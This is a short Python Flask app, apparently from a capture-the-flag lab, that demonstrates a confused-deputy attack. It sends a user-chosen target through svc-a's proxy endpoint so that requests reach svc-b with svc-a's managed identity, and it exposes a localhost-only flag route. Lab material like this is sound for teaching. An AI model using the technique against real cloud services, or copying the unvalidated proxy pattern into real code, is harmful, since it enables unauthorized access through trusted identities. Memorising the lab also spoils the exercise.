"""Confused Deputy — exploit svc-a's proxy to access svc-b with managed identity."""
import os, urllib.request
from flask import Flask, request, render_template_string

app = Flask(__name__)
FLAG = os.environ.get("FLAG","flag{cloud-17-default}")
SVC_A = os.environ.get("SVC_A_URL","http://svc-a:5000")

HTML="""<!DOCTYPE html><html><head><title>Confused Deputy Attack</title></head><body>
<h1>Service Proxy Exploit</h1><p>svc-a acts as a deputy — it forwards requests to other services using its managed identity.</p>
<form method=get action=/attack>
<label>Target: <input name=target value="svc-b:5000"></label>
<button>Proxy Request</button></form><pre>{{output}}</pre></body></html>"""

@app.route("/")
def home(): return render_template_string(HTML,output="Ready")

@app.route("/attack")
def attack():
    target=request.args.get("target","svc-b:5000")
    try:
        r=urllib.request.urlopen(f"{SVC_A}/proxy?to={target}",timeout=5)
        return render_template_string(HTML,output=f"[+] Deputy proxy response:\n{r.read().decode()}")
    except Exception as e: return render_template_string(HTML,output=f"[-] Error: {e}")

@app.route("/flag")
def flag():
    if request.remote_addr not in ("127.0.0.1","::1"): return "Forbidden",403
    return FLAG

if __name__=="__main__": app.run(host="0.0.0.0",port=5000)
